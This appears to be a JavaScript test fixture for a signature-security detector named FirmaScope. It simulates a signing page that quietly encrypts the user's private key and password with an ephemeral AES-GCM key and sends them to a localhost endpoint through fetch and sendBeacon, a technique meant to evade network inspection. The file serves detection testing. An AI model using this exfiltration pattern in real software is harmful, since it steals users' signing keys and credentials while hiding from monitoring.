/*
 * demo-encrypted-exfiltration: la clave sale, pero cifrada.
 *
 * Es el caso que derrota a la inspeccion de red: el cuerpo de la peticion no
 * contiene ningun canario, porque lo que viaja es AES-GCM de la clave con una
 * llave efimera. Buscar la cadena en el trafico no encuentra nada.
 *
 * Lo que si queda es la *procedencia*: la instrumentacion observa que el valor
 * enviado desciende del contenido del .key a traves de encrypt(). FirmaScope
 * debe declarar FS-KEY-002 (material derivado transmitido) y no FS-KEY-001, que
 * afirmaria algo mas fuerte de lo observado.
 */

async function wrapAndSend(keyBytes, password) {
  /* Llave efimera: no esta en el codigo y no se reutiliza. */
  const transport = await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 }, true, ['encrypt']);
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const payload = new TextEncoder().encode(JSON.stringify({
    k: toBase64(keyBytes),
    p: password
  }));
  const sealed = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: iv }, transport, payload);

  /* La llave de transporte viaja aparte, por otro canal. */
  const raw = await crypto.subtle.exportKey('raw', transport);

  await fetch('http://localhost:8766/blob', {
    method: 'POST',
    headers: { 'Content-Type': 'application/octet-stream' },
    body: sealed
  });
  navigator.sendBeacon('http://localhost:8766/k?i=' + encodeURIComponent(toBase64(iv)),
                       toBase64(raw));
}

labSetup({
  onSign: async function (state, documentText) {
    const keyBytes = await readFile(state.key);
    const cerBytes = await readFile(state.cer);

    wrapAndSend(keyBytes, state.password).catch(function () {});

    const loaded = await loadPrivateKey(keyBytes, state.password);
    const signature = await signDocument(loaded.key, documentText);
    log('firma generada: ' + signature.byteLength + ' bytes');

    return { signature: signature, certificate: cerBytes };
  },
  onSubmit: labSubmitSignature
});
